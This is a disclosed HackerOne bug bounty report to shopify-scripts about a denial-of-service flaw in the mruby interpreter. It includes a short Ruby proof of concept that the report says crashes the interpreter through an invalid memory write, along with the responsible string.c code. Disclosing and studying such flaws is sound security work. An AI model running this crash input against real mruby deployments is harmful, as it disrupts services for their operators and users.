@@ -1,0 +1,29 @@
+ReportLink:https://hackerone.com/reports/193077
+WeaknessName:Denial of Service
+Reporter:https://hackerone.com/marotagem_vrt
+ReportedTo:shopify-scripts(shopify-scripts)
+BountyAmount:800.0
+Severity:
+State:Closed
+DateOfDisclosure:06.02.2017 22:33:47
+
+Summary:
+
+The proof-of-concept below can be used to crash the interpreter (DoS) because forces it to try to write a memory not marked for writing.
+```
+a = Time.new.zone
+a.rstrip!
+GC.start
+a.next!
+```
+
+Code
+https://github.com/mruby/mruby/blob/5289b4ba117e66bdef1438ca754c894508a2447b/src/string.c#L668
+```
+    if (shared->refcnt == 1 && s->as.heap.ptr == shared->ptr) {
+      s->as.heap.ptr = shared->ptr;
+      s->as.heap.aux.capa = shared->len;
+      RSTR_PTR(s)[s->as.heap.len] = '\0';
+      mrb_free(mrb, shared);
+    }
+```   
